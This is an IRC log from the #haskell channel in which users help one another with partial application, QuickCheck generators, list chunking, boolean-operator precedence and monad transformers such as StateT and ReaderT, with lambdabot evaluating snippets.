00:05:35 <zzo38> If y is a list, then you do not have to write (x !! length y) since my program allows you to just write (x !! y) instead and that works. That works for some other functions too.
00:07:30 <Taneb> The existence of Control.Comonad.liftW is silly
00:08:08 <Taneb> It's an identical alternative for a function that is already defined for all Comonads
00:08:19 <zzo38> Taneb: The reason it is there is in case you have defined extend but not duplicate or fmap, then you can defined fmap from that
00:08:39 <Taneb> But Extend requires Functor?
00:09:20 <zzo38> Yes it does, but you can still define fmap based on something in a class which requires it, as long as you do not get an infinite loop
00:09:36 <Taneb> Huh, I didn't realise that
00:09:57 <Taneb> liftW seems less silly now
00:10:17 <Taneb> As does liftA
00:10:27 <zzo38> You can define both duplicate and extend if you want to; I always prefer to define duplicate and fmap, and have it define extend by itself
00:15:36 <xnoise> hello. i am a little bit confused about higher order functions chapter from learn you a haskell. are there any in depth resources i can read about that to understand better?
00:15:59 <xnoise> this set of phrases confuses me a little: Doing max 4 5 first creates a function that takes a parameter and returns either 4 or that parameter, depending on which is bigger. Then, 5 is applied to that function and that function produces our desired result.
00:16:21 <kallisti> it's talking about partial application
00:16:23 <shachaf> That phrasing is slightly confusing, so don't feel bad about that. :-)
00:16:42 <shachaf> It's a sort of weird operational way of looking at it.
00:16:50 <kallisti> essentially there are only one-argument functions in Haskell. when you write max 4 5  this is equivalent to writing (max 4) 5
00:17:06 <c_wraith> I guess partial application is an example of higher-order functions, in that it's a function that returns a function
00:17:20 <kallisti> yes.
00:17:31 <c_wraith> But usually we treat curried functions as distinct from higher-order functions that take functions as arguments
00:17:41 <shachaf> "partial application" is just a confusing term.
00:17:46 <shachaf> There's only application.
00:17:53 <xnoise> yes, what i am confused at first is this:  creates a function that takes a parameter and returns either 4 or that parameter. what parameter beside 4 and what it returns ?
00:18:07 <shachaf> xnoise: Either 4 or 5.
00:18:16 <xnoise> sorry if i sound too noobish, i come from imperative languages, and i am struggling a little to understand better
00:18:17 <xnoise> :)
00:18:21 <xnoise> agh, ok
00:18:24 <kallisti> in other words
00:18:24 <startling> so if it'm using quickcheck, what's the typical way to do that? write a really long definition of "aribitrary" for my one typeclass?
00:18:26 <kallisti> f = max 4
00:18:42 <kallisti> f is a function that takes a parameter and returns it if it's larger than (or equal to) 4
00:18:45 <xnoise> i understand now
00:18:58 <kallisti> that's "the parameter" it was referring to, it's just confusingly worded.
00:19:03 <startling> xnoise, it also means you can do "f = (+) 1"
00:19:17 <startling> xnoise, and then "f 3" is 4.
00:19:28 <xnoise> yep, i found that in some examples :)
00:19:45 <xnoise> lots of concepts i wasn't familiar with in functional programming
00:19:55 <startling> xnoise: haskell is somewhat unique in this regard
00:20:14 <kallisti> yes, not many "practical" programming languages use curried functions implicitly
00:20:23 <xnoise> well, i choose haskell because it was recommended to me by quite alot of friends in this area
00:20:32 <xnoise> and i find it fascinating
00:20:33 <xnoise> so far
00:20:53 <kallisti> plenty of languages provide an implementation of partial application. For example lisps
00:21:00 <startling> python even
00:21:01 <kallisti> and Python has a partial function which can partially apply
00:21:02 <kallisti> yes
00:21:04 <sopvop> So, I have a bunch of Either like types, and want some generic functions like getLefts :: [t a b]  -> [a]. Surely I can easily define my own typeclass for this, but I guess there must be some math theory about it and Edward Khmett already has package for this stuff, no?
00:21:24 <kallisti> sopvop: not that I'm aware of. But I'm not aware of much.
00:21:39 <shachaf> sopvop: Why would you define a type class for it?
00:21:45 <xnoise> thanks for all the answers, i'll drop by with more questions later :)
00:21:50 <kallisti> there's plenty of things that could be generalized which just simply aren't, usually because they're very trivial things to begin with.
00:22:11 <kallisti> (not to say I don't think it's a good idea)
00:22:38 <startling> why isn't the quickcheck script in cabal?
00:22:56 <startling> oh, "the quickCheck script assumes that hugs is installed on your system"
00:23:04 <sopvop> Generalization makes cleaner code.
00:23:18 <zzo38> At least with Either you can use (>>= either [] return) so possibly similar thing for a different type
00:23:22 <kallisti> or, occasionally, hard to read code.
00:23:36 <zzo38> Sorry, I mean (>>= either (const []) return) is better
00:24:02 <zzo38> That is for rights. For left you use (>>= either return (const [])) instead, of course.
00:24:25 <kallisti> sopvop: I see you've never worked with GHC.Generics :P
00:24:54 <startling> if i do "type x = y" and then "instance T x where ...", does y become an instance of T?
00:25:07 <kallisti> yes, but you need TypeSynonymInstances enabled.
00:25:11 <sopvop> Generics are like cheating.
00:25:13 <zzo38> startling: Only if you have -XTypeSynonymInstances
00:25:24 <zzo38> Otherwise it is an error.
00:25:27 <startling> oh hm
00:25:46 <startling> so I want to generate random strings in a language for my quickcheck suite.
00:25:49 <kallisti> startling: it would be all kinds of weird if instances somehow distinguished between type synonyms
00:26:05 <kallisti> when the whole point is that it's just an alias for the same type.
00:26:36 <startling> should I make String an instance of Arbitrary? what if i have a number of different kinds of strings that canbe generated?
00:27:07 <kallisti> I'm pretty sure String is already an instance
00:27:14 <kallisti> let me check
00:27:21 <kallisti> yes
00:27:25 <startling> oh hmm
00:27:29 <kallisti> instance Arbitrary a => Arbitrary [a]
00:27:33 <kallisti> instance Arbitrary Char
00:27:50 <startling> well, i want strings generated in a specific way. what should i do?
00:28:43 <kallisti> I believe CoArbitrary is used to do things like that
00:28:51 <kallisti> via the Gen type
00:29:44 <kallisti> for example elements [1,2,3]  would generate one of the values in the list
00:29:46 <startling> ah, that looks like what i'm looking for. thanks!
01:13:04 <Taneb> Happstack vs Yesod vs Snap
01:13:10 <Taneb> So many choices
01:13:47 <ClaudiusMaximus> so, error "round default defn: Bad value"  really means  "your signum gave something not in [-1,0,1], so i give up"
01:14:28 <Taneb> ClaudiusMaximus, how did you get that error?
01:14:58 <Taneb> > signum (1 :+ 1)
01:14:59 <lambdabot>   0.7071067811865475 :+ 0.7071067811865475
01:16:32 <k0ral> hi
01:16:37 <k-zed> @type (:+)
01:16:38 <lambdabot> forall a. (RealFloat a) => a -> a -> Complex a
01:16:43 <k-zed> ach so
01:17:01 <k0ral> I've compiled & installed a personal library, but I'm not able to import it from ghci
01:17:06 <ClaudiusMaximus> Taneb: by  having signum (F x) = F (signum x) which was just plain wrong...
01:17:41 <k0ral> did I miss some step ?
01:17:48 <Taneb> k0ral, how did you install it?
01:18:06 <k0ral> Taneb: cabal install
01:18:13 <k0ral> ok wait, I have some news
01:18:26 <k0ral> it works when outside my library directory
01:18:53 <k0ral> when inside, I guess there is somehow a conflict between the installed version and the local version
01:19:01 <k0ral> why is that so ?
01:19:16 <Taneb> What OS are you on?
01:19:31 <k0ral> linux
01:19:51 <k0ral> it says "attempting to use module XXX (path to XXX) which is not loaded"
01:20:05 <ClaudiusMaximus> k0ral: yeah that gets me every time too :/
01:30:25 <zzo38> How to make gopher request and HTTP POST request by Haskell?
01:31:23 <kallisti> zzo38: I don't know about gopher, but I like http-conduit for HTTP requests
01:31:56 <zzo38> The gopher request is basically the same as a finger or WHOIS request, although it might contain tabs.
01:32:27 <k0ral> how does one "unimport" a module under ghci ?
01:32:41 <zzo38> k0ral: Use :m - and the name of the module
01:33:21 <zzo38> It cannot be used with interpreted programs, however.
01:33:44 <zzo38> But it can be used to undo a :m + module command
01:33:53 <zzo38> Or to remove the Prelude
01:34:57 <k0ral> zzo38: thank you :)
01:40:33 * hackagebot ChasingBottoms 1.3.0.4 - For testing partial and infinite values.  http://hackage.haskell.org/package/ChasingBottoms-1.3.0.4 (NilsAndersDanielsson)
01:44:02 <jonaskoelker> "chasing bottoms" sounds like the FCC-approved rewording of something NSFW
01:44:08 <jonaskoelker> ^_^
01:46:26 <k0ral> is there a way to chain existing base functions to get the following behavior: [1, 2, 3, 4, 5, 6, 7] => [[1, 2], [3, 4], [5, 6], [7]] ?
01:46:56 <kallisti> why do you need that?
01:47:03 <k0ral> I can only think of a recursive way to do this
01:47:12 <k0ral> kallisti: who cares ? :)
01:47:38 <kallisti> it's not often that you actually need lists when your lists are all a fixed length (except for the odd one at the end)
01:48:11 <shachaf> k0ral: Data.List.Split probably does it.
01:48:14 <k0ral> well, it's needed because of the tail that can be a single element list
01:48:46 <k0ral> @hoogle [a] -> ([a] -> [b]) -> [[b]]
01:48:47 <lambdabot> No results found
01:48:58 <arcatan> > let l = [1,2,3,4] in zip l (tail l)
01:48:59 <lambdabot>   [(1,2),(2,3),(3,4)]
01:49:12 <arcatan> hmm, that's not what you want
01:49:29 <k0ral> indeed
01:49:40 <kallisti> yeah Data.List.Split has splitEvery
01:50:08 <DrSyzygy> > splitEvery 5 [1..30]
01:50:09 <lambdabot>   Not in scope: `splitEvery'
01:50:15 <kallisti> but I still have a slight suspicion that there's a better Y for your X.
01:50:20 <DrSyzygy> > Data.List.Split.splitEvery 5 [1..30]
01:50:22 <lambdabot>   Not in scope: `Data.List.Split.splitEvery'
01:50:25 <DrSyzygy> psht.
01:51:19 <arcatan> meh, how have I managed to miss Data.List.Split for so long? i've implemented so many of those functions myself.
01:52:18 <k0ral> I would rather say: how have Haskell people managed to keep it off Prelude for so long ?
01:53:03 <kallisti> f (x:y:xs) = ...
01:56:45 <fmap> > reverse . map reverse . foldl' (\a x -> if length (head a) == 2 then [x] : a else (x : head a) : tail a) [[]] $ [1..7]
01:56:47 <lambdabot>   [[1,2],[3,4],[5,6],[7]]
01:57:08 <shachaf> fmap: :-(
01:59:17 <k0ral> fmap: not really elegant :)
02:01:04 <fmap> and foldl' isn't in the Prelude :(
02:04:17 <solarus> > let chunk = takeWhile (not . null) . liftM2 (.) (map . take) (iterate . drop) in chunk [1..7]
02:04:18 <lambdabot>   Couldn't match expected type `[[[a]]]'
02:04:19 <lambdabot>         against inferred type `a1 ->...
02:04:24 <solarus> :(
02:05:51 <shachaf> > let chunk n = map (take n) . takeWhile (not . null) . iterate (drop n) in chunk 2 [1..7]
02:05:53 <lambdabot>   [[1,2],[3,4],[5,6],[7]]
02:06:17 <solarus> :t (.:)
02:06:18 <lambdabot> forall a b (f :: * -> *) (g :: * -> *). (Functor f, Functor g) => (a -> b) -> f (g a) -> f (g b)
02:06:26 <solarus> > let chunk = takeWhile (not . null) .: liftM2 (.) (map . take) (iterate . drop) in chunk [1..7]
02:06:27 <lambdabot>   Couldn't match expected type `GHC.Types.Int'
02:06:27 <lambdabot>         against inferred type ...
02:07:02 <kallisti> > let splitEvery _ [] = []; splitEvery n ls = before : splitEvery n after where (before, after) = splitAt n ls   in splitEvery 3 [1,2,3,4,5]
02:07:02 <lambdabot>   [[1,2,3],[4,5]]
02:08:14 <shachaf> Splevery.
02:09:32 <kallisti> but for some reason fixed-length-lists-except-for-the-remainder-at-the-end just kind of makes me frown.
02:11:10 <mudphone> Hi, does anyone happen to know what the latest powerpc-linux binary available is?  I found ghc-6.4...
02:11:37 <otters> what do you call the syntax where you modify a record's member with { member = ... }
02:11:55 <shachaf> Record syntax.
02:12:02 <otters> okay
02:14:29 <kallisti> otters: specifically "record update syntax"
02:15:03 <kallisti> Constructor {x = ...}  would be record constructor syntax or record pattern matching depending on the context.
02:15:51 <Taneb> Record pattern matching is a thing that exists!?
02:16:05 <kallisti> of course
02:16:15 <kallisti> f R {x = y} = ...
02:16:15 <Taneb> How does it work?
02:16:21 <Taneb> ...really?
02:16:22 <Taneb> Wow
02:16:28 <kallisti> yes.
02:16:34 <kallisti> I don't know how you missed it. :P
02:16:41 <kallisti> there's plenty of extensions that deal specifically with record patterns.
02:16:51 <Taneb> I learnt record syntax by being scared of it and plowing through
02:17:05 <kallisti> RecordWildCards, RecordPuns, I'm sure there are others I'm forgetting.
02:18:28 <kallisti> Taneb: records are a useful part of Haskell that suffer from not integrating with the composability of the rest of the language in a nice way.
02:18:39 <kallisti> but I'm glad they exist.
02:20:45 <womb> Hi guys!
02:21:26 <Taneb> Hey
02:23:09 <k0ral> @hoogle when
02:23:10 <lambdabot> Control.Monad when :: Monad m => Bool -> m () -> m ()
02:23:10 <lambdabot> System.Posix.Terminal WhenDrained :: TerminalState
02:23:10 <lambdabot> Test.QuickCheck.Property whenFail :: Testable prop => IO () -> prop -> Property
02:24:08 <absence> mm_freak_: but if a wire doesn't request more info than it processes, it can't be an identity wire and let (unprocessed) input pass through it. i thought having identity properties was a good thing, but maybe i misunderstood - is it only for inhibiting event wires that this property is important?
02:24:23 <k0ral> @hoogle if
02:24:24 <lambdabot> keyword if
02:24:24 <lambdabot> package IfElse
02:24:24 <lambdabot> package iff
02:24:36 <kallisti> k0ral: I recommend
02:24:42 <hc> @list
02:24:42 <lambdabot> http://code.haskell.org/lambdabot/COMMANDS
02:24:43 <kallisti> @hackage cond
02:24:43 <lambdabot> http://hackage.haskell.org/package/cond
02:24:47 <kallisti> but only because I wrote it. :P
02:24:48 <burbul> @pl process t = tell [t] >> return t
02:24:48 <lambdabot> process = ap ((>>) . tell . return) return
02:24:58 <kallisti> k0ral: what are you looking for?
02:25:08 <k0ral> something like when but without monad
02:25:17 <kallisti> I don't understand how that would work.
02:25:30 <t7> what can i call what-the-ai-knows-about-the-state-of-the-world
02:25:58 <kallisti> knowledge
02:26:07 <k0ral> kallisti: Bool -> (Bool -> a) -> a -> a
02:26:17 <k0ral> hmmm
02:26:21 <kallisti> k0ral: what?
02:26:21 <k0ral> kallisti: Bool -> a -> a -> a
02:26:35 <kallisti> so you want if-then-else as a function
02:26:37 <k0ral> @hoogle Bool -> a -> a -> a
02:26:38 <lambdabot> Data.Time.Calendar.MonthDay monthAndDayToDayOfYear :: Bool -> Int -> Int -> Int
02:26:38 <lambdabot> Graphics.Rendering.OpenGL.GL.VertexSpec TexCoord3 :: a -> a -> a -> TexCoord3 a
02:26:38 <lambdabot> Graphics.Rendering.OpenGL.GL.VertexSpec Normal3 :: a -> a -> a -> Normal3 a
02:26:51 <kallisti> @hoogle if'
02:26:51 <lambdabot> No results found
02:26:57 <k0ral> kallisti: exactly
02:26:57 <kallisti> k0ral: http://hackage.haskell.org/packages/archive/cond/0.3/doc/html/Control-Conditional.html
02:27:01 <kallisti> or
02:27:02 <k0ral> like maybe
02:27:05 <k0ral> @hoogle maybe
02:27:06 <lambdabot> Prelude data Maybe a
02:27:06 <lambdabot> Data.Maybe data Maybe a
02:27:06 <lambdabot> Prelude maybe :: b -> (a -> b) -> Maybe a -> b
02:27:13 <kallisti> if' p t f = if p  then t else f
02:27:52 <k0ral> why isn't that part of Prelude ?!
02:28:05 <ion> bool _ t True = t
02:28:06 <Eduard_Munteanu> Note you can't have an exact analogue of 'when' in a non-monadic form.
02:28:08 <kallisti> I don't know. that's why I made I made it in a library. :P
02:28:09 <ion> bool f _ False = f
02:28:42 <k0ral> Eduard_Munteanu: yes
02:28:51 <hughfdjackson> is if-then-else not a suite of functions?
02:29:09 <kallisti> it's a syntactic construct.
02:29:17 <hughfdjackson> :| probably no more than do notation, gaurds or pattern matching, i guess
02:29:18 <kallisti> equivalent to a case expression.
02:29:34 <t7> what can i call 'the level of certainty an AI has of a property of an object'?
02:29:43 <barrucadu> "confidence"
02:29:46 * hughfdjackson writes out 'fewer things are functions in haskell than you think' a few hundred times
02:29:49 <kallisti> certainty
02:29:50 <t7> ah perfect
02:29:55 <k0ral> kallisti: I like your cond module
02:30:31 <kallisti> it's nice when dealing with a lot of monadic conditionals
02:30:44 <kallisti> also I imagine it could be nice when working with the All and Any monoids, but I haven't used it for that yet.
02:31:04 <t7> is there any documents on how to model a partially know world? (before i re invent the wheel)
02:31:11 <k0ral> kallisti: actually, I was thinking of something like that, I used to talk about it here in #haskell, but everybody told me there was no point implementing this
02:31:44 <kallisti> there are many things worth implementing that have trivial implementations
02:32:37 <k0ral> yeah but many people in this channel don't encourage to implement them
02:32:47 <k0ral> glad to see someone did it
02:33:42 <kallisti> there's similar functionality scaterred across multiple libraries, but none of them seemed complete.
02:33:45 <t7> im gonna start using tabs instead of spaces because im fed with you guys moaning
02:33:54 <t7> i mean spaces instead of tabs...
02:34:23 <k0ral> t7: you may not know but you're doing yourself a favor :)
02:35:31 <kallisti> there's room for improvement, you could take Data.Algebra.Boolean and generalize it to lattices and Heyting Algebras, and turn that into a seperate library
02:35:36 <kallisti> but I don't know enough math to do that.
02:38:05 <k0ral> I don't generalize until I need so :)
02:38:32 <k0ral> I hope your library will get attention from the community
02:38:37 <kallisti> it may seem like trivial code but just ifM, notM, <&&>, and <||> have greatly improved the readability of monadic code.
02:38:52 <kallisti> no temporary variables for conditionals
02:38:58 <k0ral> totally agreed
02:39:20 <k0ral> I've always wondered why this wasn't built in Haskell in the first place
02:39:21 * barrucadu cabal-installs cond
02:39:57 <barrucadu> Woo, freedom from (some) temporary variables!
02:40:51 <kallisti> also ternary conditionals, yeaaaah!
02:41:04 * kallisti hasn't used those yet.
02:44:43 <kallisti> k0ral: I linked it on reddit but I guess I could have broadcasted to other media
02:44:51 <kallisti> like the mailing lists.
02:45:18 <hpaste> t7 pasted “how do i format with spaces? bring back tabs! :)” at http://hpaste.org/69128
02:45:48 <kallisti> t7: use an editor that supports indentation with spaces
02:46:01 <k0ral> kallisti: I'm subscribed to neither so I wouldn't have noticed anyway :)
02:46:07 <t7> it looks ugly
02:46:13 <t7> how do people make it look good
02:46:29 <kallisti> I generally accomplish this in emacs but spamming tab a lot.
02:46:57 <kallisti> it's not going to "look" any different than tabs because it's... whitespace.
02:48:12 <hc> there isn't any good lambdabot documentation around, except reading the source, is it?
02:48:42 <hc> s/is it/is there/
02:48:50 <taylorgb> Can you not just extract the lists? That's probably what makes it so ugly
02:49:51 <burbul> @t not . null
02:49:51 <lambdabot> Maybe you meant: tell thank you thanks thx ticker time todo todo-add todo-delete topic-cons topic-init topic-null topic-snoc topic-tail topic-tell type . ? @ ft v
02:49:56 <burbul> @type not . null
02:49:57 <lambdabot> forall a. [a] -> Bool
02:52:26 <mm_freak_> absence: no, you rather misunderstood "information processing" =)
02:52:33 <mm_freak_> absence: an identify wire does process its input
02:52:38 <mm_freak_> identity
02:53:08 <mm_freak_> absence: think of a function of type a -> a, of which there is only one…  it does process its argument maximally
02:53:42 <mm_freak_> absence: the point is:  except for identity-like wires, you shouldn't try to let some unspecified input fall through…  you have 'first' for that
02:53:43 <b_jonas> @djinn a -> a
02:53:43 <lambdabot> f a = a
02:53:50 <mm_freak_> or all the Applicative machinery
02:54:44 <kallisti> :t let f x = undefined `asTypeOf` x in f
02:54:45 <lambdabot> forall a. a -> a
02:54:58 <mm_freak_> absence: the identity-like wires are the few exceptions where letting input fall through makes Category-style code look much nicer
02:55:27 <mm_freak_> absence: there are other exceptions, too:  MyWire a (a, a), MyWire (a, a) a, MyWire (a, b) (a, b)
02:55:54 <mm_freak_> note that the latter is identity-like, so you wouldn't write such a type, if 'a' and 'b' are fully polymorphic
02:56:27 <mm_freak_> in general, if you have trouble deciding, go with MyWire a a
02:57:34 <hc> @uptime
02:57:34 <lambdabot> uptime: 26d 9h 57m 52s, longest uptime: 1m 10d 23h 44m 29s
02:58:47 <kallisti> what's a good precedence for xor?
02:59:01 <kallisti> relative to other boolean operators
02:59:21 <burbul> Am I right in thinking that the 'rightmost' thing listed in a monad stack is considered the 'top' of the stack?
02:59:32 <kallisti> reverse
02:59:33 <burbul> So e.g. IO always comes at the top ?
02:59:38 <kallisti> IO is at the bottom
02:59:45 <burbul> ah, ok -- thanks.
02:59:54 <burbul> In that case liftIO  is a bit confusingly named!
03:00:04 <kallisti> :t liftIO
03:00:04 <lambdabot> forall a (m :: * -> *). (MonadIO m) => IO a -> m a
03:00:17 <kallisti> takes an IO action, "lifts" it up into another monad.
03:00:31 <burbul> I was thinking of 'lift' as pushing things upwards
03:00:38 <kallisti> it is.
03:00:56 <burbul> oh, wait... hm.
03:00:57 <kallisti> the type of the IO action is converted to the type of a monad transformer that's higher in the stack.
03:01:27 <mm_freak_> kallisti: xor is addition of polynomials modulo 2
03:01:41 <mm_freak_> so you will want to use similar precedence to (+)
03:01:52 <mm_freak_> or rather you /may/ want
03:02:05 <burbul> -- I was just very confused. Thank you.
03:03:04 <kallisti> mm_freak_: currently I have it at 0
03:03:08 <burbul> Actually, one more question, please:
03:03:14 <mm_freak_> burbul: just look at the type…  the argument is a bottom level monadic value, the result is potentially a higher level monadic value
03:03:29 <burbul> mm_freak: yes, I see
03:03:30 <mm_freak_> kallisti: i think that's very unfortunate
03:03:30 <kallisti> mm_freak_: && is 0, || is 1
03:03:34 <kallisti> er
03:03:36 <kallisti> && is 3
03:03:45 <kallisti> so you think it should be higher than those?
03:03:50 * kallisti has never used xor for anything
03:04:00 <shachaf> kallisti: Just do what C does.
03:04:03 <mm_freak_> well, (&&) is multiplication modulo 2
03:04:07 <mm_freak_> and xor is addition
03:04:17 <mm_freak_> so xor should probabily be lower than (&&)
03:04:27 <kallisti> which it is
03:04:31 <kallisti> but it's lower than || as well
03:04:51 <mm_freak_> well, you shouldn't compare to (||) and (&&)
03:04:56 <mm_freak_> but to (.&.) and (.|.)
03:04:59 <shachaf> mm_freak_: This is a weird analogy to make here.
03:05:16 <t7> @pl \x -> y -> y
03:05:17 <lambdabot> (line 1, column 9):
03:05:17 <lambdabot> unexpected ">" or "-"
03:05:17 <lambdabot> expecting variable, "(", operator or end of input
03:05:20 <mm_freak_> shachaf: if you use these as numeric operations the precedence rule is very useful
03:05:21 <t7> @pl \x -> zy -> y
03:05:21 <lambdabot> (line 1, column 10):
03:05:22 <lambdabot> unexpected ">" or "-"
03:05:22 <lambdabot> expecting variable, "(", operator or end of input
03:05:24 <t7> @pl \x -> \y -> y
03:05:24 <lambdabot> const id
03:05:35 <burbul> If I have StateT s (StateT s' b) and I call 'get', which of the two (StateT _)s will it access? I can't tell from the type signature of get...
03:05:36 <shachaf> kallisti: xor is also (/=)
03:05:39 <kallisti> yes
03:05:43 <kallisti> I know that much
03:05:47 <shachaf> burbul: Try it out!
03:05:56 <burbul> ok!
03:05:59 <mm_freak_> kallisti: you have to differentiate between logical and arithemtical
03:06:13 <kallisti> I'm talking about boolean algebras...
03:06:16 <kallisti> not bitiwse operators
03:06:44 <mm_freak_> in that case there is not really a standard
03:06:45 <kallisti> is xor not "logical"?
03:07:24 <Twisol> (P v Q) ^ ~(P ^ Q), right?
03:07:33 <mm_freak_> in fact i don't see xor being used a lot in logic, and there isn't even a real standard for 'and' vs. 'or'
03:07:33 <kallisti> currently I have <--> and `xor` at the same precedence (infixr 0)
03:08:04 <mm_freak_> personally i'd set xor lowest level, then or, then and
03:08:13 <kallisti> excellent. this is what I've done.
03:08:14 <mm_freak_> but that's just for beauty of expressions i tend to write =)
03:08:35 <kallisti> also I have logical implication at 1
03:08:46 <kallisti> inbetween xor and ||
03:08:48 <kallisti> kind of arbitrary
03:09:01 <kallisti> also it's right associative. does that make sense?
03:09:12 <mm_freak_> anyway, xor shouldn't really go to level 0…  i think no custom operator should really go to level 0
03:09:25 <mm_freak_> xor or implication?
03:09:34 <Twisol> seems sensible to me, if implication
03:09:35 <kallisti> they're both right
03:09:39 <kallisti> I'm asking about implication
03:09:42 <mm_freak_> implication being right-assoc makes sense
03:09:48 <mm_freak_> for xor i'd go left
03:10:07 <mm_freak_> after all (->) is right-assoc for a reason =)
03:10:42 <kallisti> left associative for xor would be backwards from && and ||
03:10:44 <Twisol> So you're working on a boolean calculus DSL?
03:10:57 <Taneb> What's the connection between Monoid and Monad?
03:11:01 <kallisti> I wouldn't call it that. I'm just overloaded boolean operators.
03:11:03 <kallisti> *overloading
03:11:30 <kallisti> Twisol: it already exists here http://hackage.haskell.org/packages/archive/cond/0.3/doc/html/Data-Algebra-Boolean.html
03:12:04 <Twisol> a monoid is… things that can be glued together/accumulated, like lists and numbers? (would appreciate correction if that's wrong)
03:12:31 <Taneb> Twisol, yes, but with a thing such that gluing it to other things doesn't make a difference
03:12:38 <kallisti> a monoid is an associative operator with an identity element.
03:12:48 <kallisti> that's pretty much it.
03:13:00 <Twisol> so (+, 0) and (*, 1) and (++, [])
03:13:06 <kallisti> yep
03:13:08 <Taneb> Yeah
03:13:21 <Taneb> That's the Sum, Product, and [] monoids
03:13:26 <Twisol> right
03:13:39 <Taneb> There's about half a dozen monoids for Maybe
03:13:45 <fmap> (join, return)?
03:14:29 <ion> (a `join` b) `join` c ≡ a `join` (b `join` c)? :-P
03:14:32 <Twisol> Well. At least Monoid is easy to grok. :/
03:14:34 <quicksilver> surely no more than three? First/Last/use the underlying monoid
03:15:13 <mgsloan>  maybe you get more by caring how bottoms behave
03:15:28 <quicksilver> meh
03:15:33 <quicksilver> they don't count :P
03:15:38 <mgsloan> :D
03:15:38 <womb> is there something like "inspect" for haskell types ?
03:15:47 <Twisol> womb: show, I assume
03:16:03 <kallisti> what kind of "inspect" are we talking about
03:16:26 <womb> i think Twisol is right and i was stupid
03:16:38 <Twisol> :)
03:16:39 <fmap> ion: kind of
03:16:40 <kallisti> mm_freak_: would you expect implication to be equal, above, or below  <--> and xor in precedence?
03:16:50 <kallisti> (I put <--> and xor on the same precedence level because they're analogous to == and /=)
03:17:23 <burbul> I'm getting a 'not in scope: lift' error despite  importing Control.Monad
03:17:41 <Twisol> liftM?
03:17:49 <kallisti> @hoogle lift
03:17:49 <lambdabot> Text.ParserCombinators.ReadPrec lift :: ReadP a -> ReadPrec a
03:17:50 <lambdabot> Control.Applicative liftA :: Applicative f => (a -> b) -> f a -> f b
03:17:50 <lambdabot> Control.Applicative liftA2 :: Applicative f => (a -> b -> c) -> f a -> f b -> f c
03:17:57 <kallisti> lift is part of mtl and transformers
03:18:03 <Taneb> Control.Monad.Trans
03:18:14 <burbul> oops -- thanks
03:18:26 <kallisti> it's rare that you need it.
03:19:14 <burbul> Because there's some magic that automatically pushes operations up the stack?
03:19:34 <kallisti> the standard monad transformers have typeclasses with lifted operations
03:19:47 <kallisti> MonadReader, MonadState, and MonadWriter, for example.
03:19:51 <b_jonas> so it's typeclass magic
03:20:00 <kallisti> if you want to call it that.
03:20:09 <burbul> I think I may need to use StateT s (StateT s' Identity)
03:20:14 <kallisti> it's the same mechanism MonadIO uses.
03:20:26 <burbul> In which case I think I'm forced to use lift explicitly?
03:20:27 <absence> mm_freak_: i guess my trouble has been deciding which wires should be identity-like :) but it's mostly the ones that check if an event occurs?
03:20:46 <kallisti> burbul: believe so. You may be able to factor that into a single StateT though.
03:21:14 <kallisti> unless you strictly need the capability to one run one StateT before the other.
03:21:20 <burbul> Factoring it... it's a bit fiddly, but the following reason: one of the pieces of state needs to persist for much longer than the other piece of state
03:21:26 <burbul> *for the following reason
03:21:49 <kallisti> then they seem somewhat unrelated to each other
03:21:59 <burbul> That's why I don't want to force them together
03:22:24 <Twisol> So, question. I get Writer well enough, but what is Reader useful for and how are they related?
03:22:44 <kallisti> Reader is just a read-only environment value that you can access at any point.
03:23:03 <kallisti> it's useful for computations that need to refer to some initialized state frequently.
03:23:15 <kallisti> for example, network code that refers to a socket.
03:23:31 <burbul> I am substituting several lambda-expressions into a larger lambda expression, and am renaming to avoid name collision. I need to keep track of a) all the variables being used in the larger expression and b) the variable mapping used in any one substitution.
03:23:37 <kallisti> normally you'd pass around the Socket as an extra argument, which becomes annoying and ugly
03:23:37 <Taneb> 89+56+23
03:23:46 <Taneb> > 89 + 56 + 23
03:23:47 <lambdabot>   168
03:23:52 <burbul> a) needs to persist across all the substitutions; b) only needs to last for one substitution.
03:24:00 <burbul> Hence the two StateTs.
03:24:18 <burbul> If there's a cleaner way of doing it, I'd definitely be grateful to know.
03:24:18 <kallisti> burbul: but both values are always set at a given time, no?
03:24:32 <kallisti> you just end up changig the one-substition state more often
03:24:49 <burbul> well, in the outer function there isn't a variable mapping at all -- that only make sense for a single substitution.
03:24:50 <Twisol> kallisti: if we continue with that example, would the type of a function that read from a Socket stored in a Reader be ReaderT MyEnv IO ?
03:25:10 <kallisti> well, ReaderT Socket IO
03:25:13 <kallisti> unless you have other stuff
03:25:22 <Twisol> threw in MyEnv to cover that, yeah.
03:25:44 <Twisol> hmm, okay. Will have to figure out transformers sometime.
03:25:50 <kallisti> :t ask
03:25:50 <lambdabot> forall (m :: * -> *) r. (MonadReader r m) => m r
03:25:53 <kallisti> here's how you grab the state
03:26:54 <kallisti> or rather, the environment
03:27:31 <Twisol> I assume the 'm' in 'MonadReader r m' is the inner monad?
03:27:41 <kallisti> it's the monad
03:27:58 <kallisti> it's any monad with a MonadReader instance
03:28:10 <kallisti> the purpose of MonadReader is to avoid explicit lifting
03:28:15 <Twisol> ah
03:28:19 <kallisti> so there are many instances defined for the standard transformers
03:28:34 <kallisti> for example
03:29:25 <HugoDaniel> i really dont like hackage :(
03:29:30 <kallisti> instance MonadReader r m => MonadReader r (StateT s m)
03:29:32 <HugoDaniel> its getting very counter productive
03:29:43 <Taneb> HugoDaniel, how so?
03:29:50 <HugoDaniel> its so slow
03:29:52 <HugoDaniel> it hurts
03:30:01 <HugoDaniel> eh
03:30:02 <Twisol> ah, I see. 'env <- ask'
03:30:14 <kallisti> Twisol: so any StateT with an inner monad who has a MonadReader instance is also a MonadReader
03:30:49 <kallisti> there's instances for all of the other standard transformers
03:31:02 <Twisol> I'll be honest: it's 3:30 AM and monads in general are still somewhat unfamiliar, so this is going over my head a bit. :(
03:32:04 <Twisol> I kinda get what you mean though. If I'm in a state monad with an inner reader, I can use 'ask' directly?
03:32:12 <kallisti> yes
03:32:19 <kallisti> ask is a method of the MonadReader typeclass
03:32:28 <Twisol> Right. Hmm, interesting.
03:32:39 <kallisti> it's the same mechanism MonadIO uses.
03:33:05 <kallisti> instance MonadIO m => MonadIO (StateT s m)
03:33:37 <kallisti> Twisol: not just "an inner reader"
03:33:40 <kallisti> but any MonadReader instance
03:34:01 <kallisti> it percolates downward.
03:34:05 <Twisol> Right, but speaking from a specific, slightly more containable-in-one's-head instance of the situation.
03:35:10 <kallisti> another neat thing about MonadReader is local
03:35:11 <kallisti> :t local
03:35:12 <lambdabot> forall r (m :: * -> *) a. (MonadReader r m) => (r -> r) -> m a -> m a
